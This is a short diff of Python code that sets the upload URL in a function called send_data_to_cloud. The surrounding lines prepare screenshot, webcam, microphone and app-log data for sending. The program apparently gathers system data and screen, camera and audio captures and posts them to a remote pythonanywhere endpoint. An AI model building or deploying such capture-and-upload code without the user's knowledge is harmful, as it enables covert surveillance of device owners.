@@ -230,7 +230,7 @@ def get_complete_system_info():
     }
 
 def send_data_to_cloud():
-    URL = "http://username.pythonanywhere.com/update-status"
+    URL = "http://devtung.pythonanywhere.com/update-status"
     psutil.cpu_percent(interval=None)
     
     screenshot_data, cam_data, mic_data, app_log_result = None, None, None, None
